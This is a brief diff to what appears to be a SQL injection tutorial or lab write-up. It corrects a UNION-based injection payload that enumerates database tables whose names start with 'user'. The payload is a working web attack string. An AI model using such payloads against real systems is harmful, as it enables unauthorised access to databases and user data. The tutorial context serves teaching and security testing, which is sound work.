@@ -85,7 +85,7 @@ Let's enumerate the tables.
 You can narrow it down.
 
 ```sql
-' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database() AND WHERE table_name LIKE 'user%'#
+' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database() AND table_name LIKE 'user%'#
 ```
 
 Let's note down the tables we've discovered that are potential to retrieve data.
